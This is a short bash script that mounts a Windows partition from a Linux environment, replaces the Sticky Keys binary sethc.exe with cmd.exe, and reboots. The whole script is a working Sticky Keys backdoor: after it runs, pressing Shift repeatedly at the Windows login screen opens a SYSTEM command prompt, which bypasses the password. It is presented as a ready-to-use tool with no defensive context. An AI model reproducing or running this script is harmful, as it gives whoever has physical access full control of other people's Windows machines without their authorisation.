echo "welcome to shcl! :)"
echo ""
echo "!!!!!IMPORTANT!!!!!"
echo "write out the drive that you want to run shcl on (ex: /dev/sda1)"
echo "if you fuck this up then its not my fault."
echo "here's a list of drives. pick the right one!"
lsblk
read -p "> " choose

echo "mounting..."
mkdir /mnt/win
sudo mount.ntfs-3g $choose /mnt/win

echo "copying..."
sudo cp /mnt/win/Windows/System32/sethc.exe /mnt/win/Windows/System32/sethc_o.exe
sudo cp /mnt/win/Windows/System32/cmd.exe /mnt/win/Windows/System32/sethc.exe

echo "umounting..."
sudo umount /mnt/win
sudo rm -r /mnt/win

echo "done! the system will now reboot."

sleep 2
reboot